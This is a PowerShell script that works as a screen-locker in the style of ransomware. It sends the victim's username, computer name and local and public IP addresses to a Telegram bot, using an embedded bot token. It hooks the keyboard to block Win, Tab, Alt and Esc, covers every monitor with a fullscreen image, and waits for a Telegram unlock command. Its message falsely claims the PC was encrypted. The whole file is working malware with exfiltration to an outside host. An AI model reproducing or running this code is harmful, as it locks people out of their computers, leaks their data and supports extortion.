# SETTINGS
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$unlockCommand = "/unlock$user"

# DOWNLOAD IMAGE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# SEND TELEGRAM MESSAGE
function Send-Telegram-Message {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80'
        })[0].IPAddress
    } catch { $ipLocal = "n/a" }

    try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }

    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nUnlock it: $unlockCommand"
    $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
}

Send-Telegram-Message

# LOW-LEVEL KEYBOARD HOOK
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Block() {
        hookId = SetHook(proc);
    }

    public static void Unblock() {
        UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);

            if (vkCode == 0x43) Environment.Exit(0); // 'C'
            if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1; // Win keys
            if (vkCode == 0x09 || vkCode == 0x12 || vkCode == 0x1B) return (IntPtr)1; // Tab, Alt, Esc
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

[KeyBlocker]::Block()

# FULLSCREEN IMAGE ALL MONITORS
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        WindowState = 'Maximized'
        FormBorderStyle = 'None'
        TopMost = $true
        Location = $screen.Bounds.Location
        Size = $screen.Bounds.Size
        BackColor = 'Black'
        Cursor = [System.Windows.Forms.Cursors]::None
    }

    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImagePath)
        Dock = 'Fill'
        SizeMode = 'StretchImage'
    }

    $form.Controls.Add($pb)
    $form.Add_Deactivate({ $form.Activate() })
    $form.Show()
    $form
}

# TELEGRAM LISTENER
Start-Job {
    $uri = "https://api.telegram.org/bot$using:botToken/getUpdates"
    $offset = 0
    while ($true) {
        $updates = Invoke-RestMethod "$uri?timeout=20&offset=$offset"
        foreach ($update in $updates.result) {
            $offset = $update.update_id + 1
            if ($update.message.text -eq $using:unlockCommand) {
                [System.Windows.Forms.Application]::Exit()
                Exit
            }
        }
        Start-Sleep -Seconds 1
    }
}

# RUN THE APP
[System.Windows.Forms.Application]::Run()

# CLEANUP ON EXIT
[KeyBlocker]::Unblock()
